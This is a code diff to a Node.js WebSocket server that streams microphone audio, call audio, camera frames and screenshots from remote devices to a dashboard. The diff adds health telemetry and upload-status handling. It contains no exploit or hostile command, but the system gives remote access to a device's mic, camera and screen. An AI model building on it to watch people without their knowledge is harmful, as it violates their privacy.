@@ -7,11 +7,49 @@ const { parseReqUrl } = require("../utils/url");
 const { normalizeDeviceId } = require("../utils/device");
 const deviceStore = require("../models/deviceStore");
 const dashboardStore = require("../models/dashboardStore");
-const { broadcastToDashboard, broadcastToDeviceSubscribers } = require("../services/dashboardService");
+const { broadcastToDashboard, broadcastToDeviceSubscribers, safeSend } = require("../services/dashboardService");
 const { parseAudioPayload, buildAmplifiedPayload } = require("../utils/audio");
 const { saveUploadedPhoto } = require("../services/photoService");
 
 const { DASHBOARD_MAX_BUFFERED_BYTES } = require("../config");
+
+function compactHealthSignature(health = {}) {
+  return [
+    health.wsConnected,
+    health.dashboardConnected,
+    health.micCapturing,
+    health.cameraCapturing,
+    health.reason,
+    health.streamCodec,
+    health.streamCodecMode,
+    health.voiceProfile,
+    health.callCaptureMode,
+    health.earpieceBoost,
+    health.callAecMode,
+    health.internetOnline,
+    health.callActive,
+    health.batteryPct,
+    health.charging,
+    health.lowNetwork,
+    health.lowNetworkRequested,
+    health.networkLagging,
+    health.droppingPackets,
+    health.imageUploadStatus,
+    health.imageQueued,
+    health.imageUploading,
+    health.uploadPausedForAudio,
+    health.imageQueueDepth,
+    health.audioDrops,
+    health.silenceDrops,
+    health.frameMs,
+    health.photoQuality,
+    health.photoNight,
+    health.netType,
+    health.networkLocked,
+    health.appLocked,
+    health.gainLevel,
+  ].join("|");
+}
 
 function handleAudioDevice(ws, req) {
   const { pathname } = parseReqUrl(req.url || "");
@@ -41,10 +79,11 @@ function handleAudioDevice(ws, req) {
     appVersionName: "",
     appVersionCode: 0,
     connectedAt: new Date(),
-    recordingSampleRate: 16000,
     health: {
       wsConnected: true,
+      dashboardConnected: true,
       micCapturing: false,
+      cameraCapturing: false,
       lastAudioChunkAt: Date.now(),
       lastHealthAt: Date.now(),
       reason: "connected",
@@ -54,6 +93,11 @@ function handleAudioDevice(ws, req) {
       charging: null,
       networkLocked: false,
       appLocked: false,
+      imageUploadStatus: "idle",
+      imageQueued: false,
+      imageUploading: false,
+      uploadPausedForAudio: false,
+      imageQueueDepth: 0,
       gainLevel: 1.0,
     },
   };
@@ -114,9 +158,7 @@ function handleAudioDevice(ws, req) {
         console.log(`✅ ACK from ${deviceId}: ${text}`);
         broadcastToDashboard({ type: "ack", deviceId, message: text });
       } else if (text.startsWith("FILE:")) {
-        const filename = text.replace("FILE:", "");
-        console.log(`💾 ${deviceId} saved recording: ${filename}`);
-        broadcastToDashboard({ type: "recording_saved", deviceId, filename });
+        console.log(`Ignoring FILE message from ${deviceId}; audio recording is disabled`);
       } else if (text === `pong:${deviceId}`) {
         // heartbeat pong — ignore
       } else if (text.startsWith("{")) {
@@ -134,7 +176,9 @@ function handleAudioDevice(ws, req) {
             if (dev) {
               dev.health = {
                 wsConnected: json.wsConnected !== false,
+                dashboardConnected: json.dashboardConnected !== false && json.wsConnected !== false,
                 micCapturing: json.micCapturing === true,
+                cameraCapturing: json.cameraCapturing === true,
                 lastAudioChunkAt: Number(
                   json.lastAudioChunkSentAt || dev.health?.lastAudioChunkAt || 0,
                 ),
@@ -147,14 +191,23 @@ function handleAudioDevice(ws, req) {
                   json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                 ),
                 voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "near"),
+                callCaptureMode: String(json.callCaptureMode || dev.health?.callCaptureMode || "mic"),
+                earpieceBoost: String(json.earpieceBoost || dev.health?.earpieceBoost || "off"),
+                callAecMode: String(json.callAecMode || dev.health?.callAecMode || "auto"),
                 noiseDb: Number.isFinite(Number(json.noiseDb)) ? Number(json.noiseDb) : null,
                 internetOnline: json.internetOnline !== false,
                 callActive: json.callActive === true,
                 batteryPct: Number.isFinite(Number(json.batteryPct)) ? Number(json.batteryPct) : null,
                 charging: typeof json.charging === "boolean" ? json.charging : null,
                 lowNetwork: json.lowNetwork === true,
+                lowNetworkRequested: json.lowNetworkRequested === true,
                 networkLagging: json.networkLagging === true,
                 droppingPackets: json.droppingPackets === true,
+                imageUploadStatus: String(json.imageUploadStatus || dev.health?.imageUploadStatus || "idle"),
+                imageQueued: json.imageQueued === true,
+                imageUploading: json.imageUploading === true,
+                uploadPausedForAudio: json.uploadPausedForAudio === true,
+                imageQueueDepth: Number(json.imageQueueDepth || 0),
                 audioDrops: Number(json.audioDrops || dev.health?.audioDrops || 0),
                 silenceDrops: Number(json.silenceDrops || dev.health?.silenceDrops || 0),
                 frameMs: Number(json.frameMs || dev.health?.frameMs || 20),
@@ -173,10 +226,49 @@ function handleAudioDevice(ws, req) {
                 gainLevel: Number.isFinite(Number(json.gainLevel)) ? Number(json.gainLevel) : 1.0,
               };
             }
+            if (dev?.health) {
+              const now = Date.now();
+              const signature = compactHealthSignature(dev.health);
+              const shouldBroadcast =
+                signature !== dev._lastHealthSignature ||
+                !dev._lastHealthBroadcastAt ||
+                now - dev._lastHealthBroadcastAt > 5000;
+              if (shouldBroadcast) {
+                dev._lastHealthSignature = signature;
+                dev._lastHealthBroadcastAt = now;
+                broadcastToDashboard({
+                  type: "device_health",
+                  deviceId,
+                  health: dev.health,
+                });
+              }
+            }
+          } else if (json.type === "image_upload_status") {
+            const dev = deviceStore.getDevice(deviceId);
+            if (dev) {
+              dev.health = {
+                ...(dev.health || {}),
+                imageUploadStatus: String(json.status || "idle"),
+                imageQueued: json.imageQueued === true,
+                imageUploading: json.uploading === true,
+                uploadPausedForAudio: json.uploadPausedForAudio === true,
+                imageQueueDepth: Number(json.queueDepth || 0),
+                lowNetwork: json.audioLive === true ? true : dev.health?.lowNetwork === true,
+              };
+            }
             broadcastToDashboard({
-              type: "device_health",
+              type: "image_upload_status",
               deviceId,
-              health: dev?.health || null,
+              status: String(json.status || "idle"),
+              command: String(json.command || ""),
+              filename: String(json.filename || ""),
+              audioLive: json.audioLive === true,
+              imageQueued: json.imageQueued === true,
+              uploadPausedForAudio: json.uploadPausedForAudio === true,
+              uploading: json.uploading === true,
+              uploaded: json.uploaded === true,
+              queueDepth: Number(json.queueDepth || 0),
+              ts: Number(json.ts || Date.now()),
             });
           } else if (json.type === "photo_upload" || json.type === "screenshot_upload") {
             const saved = saveUploadedPhoto(deviceId, json);
@@ -235,11 +327,6 @@ function handleAudioDevice(ws, req) {
     const buf = Buffer.from(data);
 
     // Keep binary diagnostics lightweight; per-frame logs add latency on weak hosts.
-    if (buf.length >= 4 && (!dev._lastBinaryHeaderLogAt || Date.now() - dev._lastBinaryHeaderLogAt > 10_000)) {
-      dev._lastBinaryHeaderLogAt = Date.now();
-      console.log(`[Binary Frame] First 4 bytes: ${buf.slice(0, 4).toString('hex')}`);
-    }
-
     // ── Binary Camera Live Frame Routing ────────────────────────────────────
     if (buf.length >= 4 && buf[0] === 0x43 && buf[1] === 0x4C) { // 'C', 'L'
       const headerLen = (buf[2] << 8) | buf[3];
@@ -273,7 +360,6 @@ function handleAudioDevice(ws, req) {
       }
       return; // Photo/screenshot frames are not audio.
     }
-    const wantsToRecord = false; // Recording feature removed
     let hasDashboardSubscribers = false;
     dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
       hasDashboardSubscribers = true;
@@ -283,10 +369,11 @@ function handleAudioDevice(ws, req) {
       dev.health.lastAudioChunkAt = Date.now();
       dev.health.micCapturing = true;
       dev.health.wsConnected = true;
+      dev.health.dashboardConnected = true;
     }
 
-    // If nobody is listening AND we are not recording, skip audio processing/routing.
-    if (!hasDashboardSubscribers && !wantsToRecord) {
+    // If nobody is listening, skip audio processing/routing.
+    if (!hasDashboardSubscribers) {
       return;
     }
 
@@ -307,7 +394,7 @@ function handleAudioDevice(ws, req) {
     }
 
     const now = Date.now();
-    if (!dev._lastAudioLogAt || now - dev._lastAudioLogAt > 5000) {
+    if (!dev._lastAudioLogAt || now - dev._lastAudioLogAt > 30000) {
       dev._lastAudioLogAt = now;
       console.log(
         `🎵 [Audio] from ${deviceId}: ${data.length} bytes${parsedAudio ? `, HQ=${parsedAudio.isHqMode}` : ""}`,
@@ -350,7 +437,6 @@ function handleAudioDevice(ws, req) {
       if (client.readyState !== WebSocket.OPEN) return;
       const buffered = client.bufferedAmount || 0;
       const now = Date.now();
-      const hardDropThreshold = DASHBOARD_MAX_BUFFERED_BYTES * 2;
       if (buffered > DASHBOARD_MAX_BUFFERED_BYTES) {
         client._audioBackoffLevel = Math.min((client._audioBackoffLevel || 0) + 1, 6);
         const backoffMs = Math.min(120 * (2 ** client._audioBackoffLevel), 2000);
@@ -359,7 +445,8 @@ function handleAudioDevice(ws, req) {
         if (!client._lastDropNotifyAt || now - client._lastDropNotifyAt > 5_000) {
           client._lastDropNotifyAt = now;
           try {
-            client.send(
+            safeSend(
+              client,
               JSON.stringify({
                 type: "audio_quality",
                 deviceId,
@@ -386,7 +473,7 @@ function handleAudioDevice(ws, req) {
         client._audioBackoffLevel = Math.max(0, client._audioBackoffLevel - 1);
       }
 
-      client.send(audioFrame);
+      safeSend(client, audioFrame, DASHBOARD_MAX_BUFFERED_BYTES * 2);
     });
 
 
